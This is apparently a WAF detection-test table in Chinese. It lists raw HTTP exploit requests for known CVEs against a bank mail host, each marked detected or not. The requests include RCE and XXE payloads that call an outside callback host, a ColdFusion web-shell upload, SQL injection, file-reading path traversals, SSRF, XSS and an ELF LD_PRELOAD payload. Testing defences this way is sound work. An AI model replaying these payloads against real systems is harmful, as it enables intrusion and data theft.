请求头信息,URL,标志,用例名称,用例描述,东莞现场WAF检测情况
 POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld&qhaeshs=7069605685876490241 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069605685876490241-r-nUser-Agent: Nacos-Server-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld,7069605685876490241,Web应用Nacos越权访问漏洞（CVE-2021-29441）,nacos是中国阿里巴巴（Alibaba）的一个动态服务发现、配置和服务管理平台。该软件支持基于 DNS 和基于 RPC 的服务发现，可提供提供实时健康检查，阻止服务向不健康的主机或服务实例发送请求等功能。Nacos 存在安全漏洞，该漏洞源于允许Nacos服务器绕过过滤器，从而跳过身份验证检查。这种机制依赖于用户代理HTTP头，因此很容易被欺骗。,未检测
 POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld&qhaeshs=7069605685876490241 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 0-r-nqhaeshs: 7069605685876490241-r-nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/532.1 (KHTML， like Gecko) Chrome/45.0.856.0 Safari/532.1-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld,7069605685876490241,Web应用Nacos越权访问漏洞（CVE-2021-29441）,nacos是中国阿里巴巴（Alibaba）的一个动态服务发现、配置和服务管理平台。该软件支持基于 DNS 和基于 RPC 的服务发现，可提供提供实时健康检查，阻止服务向不健康的主机或服务实例发送请求等功能。Nacos 存在安全漏洞，该漏洞源于允许Nacos服务器绕过过滤器，从而跳过身份验证检查。这种机制依赖于用户代理HTTP头，因此很容易被欺骗。,未检测
 POST /checkValid?qhaeshs=7069605636379508736 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 152-r-nqhaeshs: 7069605636379508736-r-nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nAccept-Language: en-r-nAuthorization: Basic YWRtaW46cGFzcw==-r-nContent-Type: application/x-www-form-urlencoded-r-nCookie: mongo-express=s%3ATsTOacSKyGNt0BZUxSK5oa7QIddtm2gL.5KGE4ZATHtmiVu889dKKSzTAUtjMjgXVuCw2cvl7kQc-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-ndocument=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping -c 1 -w 10 cgujl32weksaxdp6.zero-day.club"),/checkValid,7069605636379508736,Web应用Mongo-Express远程代码执行漏洞（CVE-2019-10758）,mongo-express是一款用于交互式管理MongoDB数据库的、基于Web的轻量级管理界面。mongo-express 0.54.0之前版本中存在安全漏洞。攻击者可借助使用toBSON方法的端点利用该漏洞执行代码。,检测
 GET /metinfo7b/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+26644*70277，1--+&site=admin&qhaeshs=7069605543794442241 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605543794442241-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/56.0.2924.87 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nCookie: re_url=http%3A%2F%2F10.10.10.70%2Fmetinfo7b%2Fadmin%2F%3Fn%3Dproduct%26c%3Dproduct_admin%26a%3Ddopara%26app_type%3Dshop%26id%3D1%2520union%2520SELECT%25201%2C2%2C3%2C111%2A111%2C5%2C6%2C7%2520limit%25205%2C1%2520%2523; PHPSESSID=b4088f046bf9a570f2964ffc86d258ff; Hm_lvt_520556228c0113270c0c772027905838=1637894627; met_auth=54624ZV89JYTsETtpOXOEvYTPCTIPZeCLfWf%2FYm8etnGS9Tn2WKQaGY6rYG%2BlBEo3Jh3lKXDY3ytGb1TTp9vtIDGVxPE; met_key=8GCKqgr; admin_lang=cn; Hm_lpvt_520556228c0113270c0c772027905838=1637896128; page_iframe_url=http://10.10.10.70/metinfo7/index.php?lang=cn&pageset=1-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/metinfo7b/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+26644*70277，1--+&site=admin,7069605543794442241,Web应用Metinfo SQL 注入漏洞（CVE-2019-17418）,MetInfo是中国米拓（MetInfo）公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。MetInfo 7.0版本中的存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。,检测
 GET /api/geojson?url=file:///etc/passwd&qhaeshs=7069605518670561281 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605518670561281-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/api/geojson?url=file:///etc/passwd,7069605518670561281,Web应用Metabase文件上传漏洞（CVE-2021-41277）,Metabase是美国Metabase公司的一个开源数据分析平台。Metabase 中存在输入验证错误漏洞，该漏洞源于产品的 admin-＞settings-＞maps-＞custom maps-＞add a map 操作缺少权限验证。攻击者可通过该漏洞获得敏感信息。,检测
 POST /lumis/portal/controller/xml/PageControllerXml.jsp?qhaeshs=7069605469177774081 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 167-r-nqhaeshs: 7069605469177774081-r-nUser-Agent: Mozilla/5.0 (Windows 98; Win 9x 4.90) AppleWebKit/536.2 (KHTML， like Gecko) Chrome/38.0.878.0 Safari/536.2-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n<?xml version="1.0" ?>-r-n<!DOCTYPE r [-r-n<!ELEMENT r ANY >-r-n<!ENTITY xxe SYSTEM "http://goxvkq1zxfv0fjw6.zero-day.club">-r-n]>-r-n<method name="addPage">-r-n<id>&xxe;</id>-r-n</,/lumis/portal/controller/xml/PageControllerXml.jsp,7069605469177774081,Web应用Lumis XML实体注入漏洞（CVE-2021-27931）,LumisXP aka Lumis Experience Platform是葡萄牙 （LumisXP）公司的一个应用软件。提供了一个管理客户的平台。LumisXP before 10.0.0 存在安全漏洞，该漏洞允许通过对PageControllerXml.jsp的API请求进行未经身份验证的盲XXE。,检测
 POST /lucee/admin/imgProcess.cfm?file=/../../../context/1NmL0.cfm&qhaeshs=7069605423162064896 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 764-r-nqhaeshs: 7069605423162064896-r-nUser-Agent: Mozilla/5.0 (Linux; Android 2.0) AppleWebKit/532.1 (KHTML， like Gecko) Chrome/35.0.806.0 Safari/532.1-r-nAccept-Encoding: gzip， deflate-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/webp，*/*;q=0.8-r-nContent-Type: application/x-www-form-urlencoded-r-nCookie: cfid=01798543-e387-4c0b-9ffe-ba26a824fdfb; cftoken=0-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nimgSrc=-r-n<cfoutput>-r-n-r-n<table>-r-n<form method="POST" action="">-r-n<tr><td>Command:</td><td><input type=test name="cmd" size=50-r-n<cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>-r-n<tr><td>Options:</td><td> <input type=text name="opts" size=50-r-n<cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>-r-n<tr><td>Timeout:</td><td> <input type=text name="timeout" size=4-r-n<cfif isdefined("form.timeout")>value="#form.timeout#"-r-n<cfelse> value="5"</cfif>></td></tr>-r-n</table>-r-n<input type=submit value="Exec" >-r-n</form>-r-n<cfif isdefined("form.cmd")>-r-n<cfsavecontent variable="myVar">-r-n<cfexecute name = "#Form.cmd#"-r-narguments = "#Form.opts#"-r-ntimeout = "#Form.timeout#">-r-n</cfexecute>-r-n</cfsavecontent>-r-n<pre>-r-n#HTMLCodeFormat(myVar)#-r-n</,/lucee/admin/imgProcess.cfm?file=/../../../context/1NmL0.cfm,7069605423162064896,Web应用Lucee远程代码执行漏洞（CVE-2021-21307）,Lucee Server中存在授权问题漏洞，该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。,检测
 GET /getCorsFile?urlPath=file:///etc/passwd&qhaeshs=7069605373723803649 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605373723803649-r-nUser-Agent: Mozilla/5.0 (iPad; CPU iPad OS 7_1_2 like Mac OS X) AppleWebKit/532.1 (KHTML， like Gecko) FxiOS/10.5e5454.0 Mobile/58A864 Safari/532.1-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/getCorsFile?urlPath=file:///etc/passwd,7069605373723803649,Web应用Kkfileview目录遍历漏洞（CVE-2021-43734）,Keking KkFileview是中国凯京科技（Keking）公司的一个 Spring-Boot 打造文件文档在线预览项目。Keking kkFileview 存在安全漏洞，该漏洞源于存在通过目录遍历漏洞读取任意文件，可能导致相关主机上的敏感文件泄漏。,检测
 GET /ics?tool=search&query=%22%3E%3Cscript%3Ealert(xss_test_20211202)%3C/script%3E&qhaeshs=7069605273949700097 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605273949700097-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept: */*-r-nAccept-Encoding: gzip， deflate-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/ics?tool=search&query=%22%3E%3Cscript%3Ealert(xss_test_20211202)%3C/script%3E,7069605273949700097,Web应用Jenzabar跨站脚本注入漏洞（CVE-2021-26723）,Jenzabar是美国Jenzabar公司的一个用于搭建管理学生信息平台的建站系统。此编号与CNNVD-202102-567重复，相关内容已删除，请参考CNNVD-202102-567的信息。,检测
 GET /Images/Remote?imageUrl=http://www.baidu.com&qhaeshs=7069605236851081217 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605236851081217-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/Images/Remote?imageUrl=http://www.baidu.com,7069605236851081217,Web应用Jellyfin服务端请求伪造漏洞（CVE-2021-29490）1,Jellyfin是一个免费软件媒体系统。可让您控制媒体的管理和流式传输。它是专有Emby和Plex的替代产品，可以通过多个应用程序将专用服务器中的媒体提供给最终用户设备。Jellyfin 10.7.3之前的版本存在代码问题漏洞，该漏洞可能会暴露内部和外部的HTTP服务器，或者其他通过HTTP GET 从Jellyfin服务器看到的资源。目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96。,检测
 GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/?qhaeshs=7069605227699109889 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605227699109889-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9，en;q=0.8，en-GB;q=0.7，en-US;q=0.6-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/,7069605227699109889,Web应用Jellyfin文件读取漏洞（CVE-2021-21402）,Jellyfin是一个免费软件媒体系统。可让您控制媒体的管理和流式传输。它是专有Emby和Plex的替代产品，可以通过多个应用程序将专用服务器中的媒体提供给最终用户设备。Jellyfin before version 10.7.1存在安全漏洞，该漏洞源于精心制作的请求将允许从Jellyfin服务器的文件系统读取任意文件。,检测
 GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd&qhaeshs=7069605198875852801 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605198875852801-r-nCache-Control: max-age=0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/91.0.4472.77 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9，en;q=0.8-r-nCookie: JSESSIONID=BE7188472967EA0C625AFCC791710D6D-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd,7069605198875852801,Web应用JEEWMS仓库管理系统权限绕过漏洞和未授权任意文件读取漏洞,jeewms是一个基于JAVA的仓库管理系统。存在权限绕过漏洞和未授权任意文件读取。,检测
 GET /interlib/report/ShowImage?localPath=C:%5CWindows%5Csystem.ini&qhaeshs=7069605121990066177 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605121990066177-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/91.0.4472.77 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nAccept-Encoding: gzip， deflate-r-nAccept-Language: zh-CN，zh;q=0.9，en;q=0.8-r-nCookie: JSESSIONID=EB2791C718F40B9791D18FAC6DED9D92-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/interlib/report/ShowImage?localPath=C:%5CWindows%5Csystem.ini,7069605121990066177,Web应用图创软件任意文件读取漏洞（CNVD-2021-34454）,图创软件是一家图书馆行业应用软件系统。图书馆站群管理系统存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件。,检测
 GET /i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd&qhaeshs=7069605095326875649 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605095326875649-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: -r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd,7069605095326875649,Web应用I3geo文件包含漏洞（CVE-2022-32409）,i3geo是saladesituacao开源的一个用于开发交互式网络地图的应用程序。i3geo v7.0.5 版本存在安全漏洞，该漏洞源于 codemirror.php 组件中的本地文件包含 (LFI) 漏洞允许攻击者通过精心设计的 HTTP 请求执行任意 PHP 代码。,检测
 GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini&qhaeshs=7069605002150412289 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069605002150412289-r-nsec-ch-ua: "Google Chrome";v="89"， "Chromium";v="89"， ";Not A Brand";v="99"-r-nsec-ch-ua-mobile: ?0-r-nUpgrade-Insecure-Requests: 1-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/89.0.4389.114 Safari/537.36-r-nAccept: text/html，application/xhtml+xml，application/xml;q=0.9，image/avif，image/webp，image/apng，*/*;q=0.8，application/signed-exchange;v=b3;q=0.9-r-nSec-Fetch-Site: none-r-nSec-Fetch-Mode: navigate-r-nSec-Fetch-User: ?1-r-nSec-Fetch-Dest: document-r-nAccept-Encoding: gzip， deflate， br-r-nAccept-Language: zh-CN，zh;q=0.9，en-US;q=0.8，en;q=0.7-r-nCookie: mldn-session-id=da3468af-7d49-410f-9bc5-85411dff0af0-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini,7069605002150412289,Web应用好视通视频会议平台存在前台任意文件下载漏洞（CNVD-2020-62437）,好视通视频会议是由深圳市华视瑞通信息技术有限公司开发，应用于SAAS领域的3G互联网视频会议，。好视通视频会议平台存在弱口令及前台任意文件下载漏洞，可获取任意敏感文件信息。,检测
 POST /fileDownload?action=downloadBackupFile&qhaeshs=7069604986757316609 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 20-r-nqhaeshs: 7069604986757316609-r-nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/90.0.4430.212 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: application/json， text/plain， */*-r-nContent-Type: application/x-www-form-urlencoded; charset=UTF-8-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nfullPath=/etc/passwd,/fileDownload?action=downloadBackupFile,7069604986757316609,Web应用会捷通云视讯登录绕过漏洞1,会捷通云视讯平台是基于软视频会议在私有云或者公有云环境下提供的企业级视频通讯平台。攻击者绕过登录时的验证系统直接进入到其他页面的漏洞。,检测
 GET /him/api/rest/V1.0/system/log/list?filePath=../&qhaeshs=7069604977664065537 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069604977664065537-r-nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/69.0.3497.81 Safari/537.36-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/him/api/rest/V1.0/system/log/list?filePath=../,7069604977664065537,Web应用会捷通云视讯登录绕过漏洞,会捷通云视讯平台是基于软视频会议在私有云或者公有云环境下提供的企业级视频通讯平台。攻击者绕过登录时的验证系统直接进入到其他页面的漏洞。,检测
 GET /dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1&qhaeshs=7069604943409184769 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nqhaeshs: 7069604943409184769-r-nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-n,/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1,7069604943409184769,Web应用Grafana跨站脚本注入漏洞（CVE-2021-41174）,Grafana是Grafana实验室的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。Grafana 存在跨站脚本漏洞，该漏洞源于没有对 URL 进行验证，导致 AngularJS 渲染引擎执行 URL 中包含的 JavaScript 表达式。,检测
 POST /cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&qhaeshs=7069604837167464449 HTTP/1.1-r-nHost: mail.dgcb.com.cn-r-nX-Forwarded-For: 101.199.125.196， 172.100.12.64-r-nContent-Length: 6392-r-nUser-Agent: python-requests/2.25.0-r-nAccept-Encoding: gzip， deflate-r-nAccept: */*-r-nContent-Type: application/x-www-form-urlencoded-r-nqhaeshs: 7069604837167464449-r-nX-Forwarded-Host: mail.dgcb.com.cn-r-n-r-nELF\x2\x1\x1\x0\x0\x0\x0\x0\x0\x0\x0\x0\x3\x0>\x0\x1\x0\x0\x0p\x9\x0\x0\x0\x0\x0\x0@\x0\x0\x0\x0\x0\x0\x08\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0@\x08\x0\x7\x0@\x0\x1b\x0\x1a\x0\x1\x0\x0\x0\x5\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x84\xc\x0\x0\x0\x0\x0\x0\x84\xc\x0\x0\x0\x0\x0\x0\x0\x0 \x0\x0\x0\x0\x0\x1\x0\x0\x0\x6\x0\x0\x0\xf8-r\x0\x0\x0\x0\x0\x0\xf8-r \x0\x0\x0\x0\x0\xf8-r \x0\x0\x0\x0\x0 \x3\x0\x0\x0\x0\x0\x0(\x3\x0\x0\x0\x0\x0\x0\x0\x0 \x0\x0\x0\x0\x0\x2\x0\x0\x0\x6\x0\x0\x0\x18\xe\x0\x0\x0\x0\x0\x0\x18\xe \x0\x0\x0\x0\x0\x18\xe \x0\x0\x0\x0\x0\xc0\x1\x0\x0\x0\x0\x0\x0\xc0\x1\x0\x0\x0\x0\x0\x0\x8\x0\x0\x0\x0\x0\x0\x0\x4\x0\x0\x0\x4\x0\x0\x0\xc8\x1\x0\x0\x0\x0\x0\x0\xc8\x1\x0\x0\x0\x0\x0\x0\xc8\x1\x0\x0\x0\x0\x0\x0$\x0\x0\x0\x0\x0\x0\x0$\x0\x0\x0\x0\x0\x0\x0\x4\x0\x0\x0\x0\x0\x0\x0P\xe5td\x4\x0\x0\x0\xfc\xb\x0\x0\x0\x0\x0\x0\xfc\xb\x0\x0\x0\x0\x0\x0\xfc\xb\x0\x0\x0\x0\x0\x0\x1c\x0\x0\x0\x0\x0\x0\x0\x1c\x0\x0\x0\x0\x0\x0\x0\x4\x0\x0\x0\x0\x0\x0\x0Q\xe5td\x6\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x10\x0\x0\x0\x0\x0\x0\x0R\xe5td\x4\x0\x0\x0\xf8-r\x0\x0\x0\x0\x0\x0\xf8-r \x0\x0\x0\x0\x0\xf8-r \x0\x0\x0\x0\x0\x8\x2\x0\x0\x0\x0\x0\x0\x8\x2\x0\x0\x0\x0\x0\x0\x1\x0\x0\x0\x0\x0\x0\x0\x4\x0\x0\x0\x14\x0\x0\x0\x3\x0\x0\x0GNU\x0\x19盒\xc5.\xde\x12\xafT\x8dC\xce(\xfd拙WTpV\x0\x0\x0\x0\x3\x0\x0\x0\x11\x0\x0\x0\x1\x0\x0\x0\x6\x0\x0\x0\x88\xc0 \x1\x0\x4@\x9\x11\x0\x0\x0\x13\x0\x0\x0\x15\x0\x0\x0BE侦汇\x92|\xd8qX\x1c\xb9\x8d\xf1\xe胗\xef\xe\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x3\x0\x9\x0\x88\x8\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x1c\x0\x0\x0 \x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\xa1\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\xac\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x8f\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x1\x0\x0\x0 \x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0a\x0\x0\x0 \x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0z\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x8a\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\xb2\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x99\x0\x0\x0\x12\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x08\x0\x0\x0 \x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0R",/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0,7069604837167464449,Web应用Goahead远程代码执行漏洞（CVE-2017-17562）,Embedthis GoAhead是美国Embedthis软件公司的一款嵌入式Web服务器。,检测
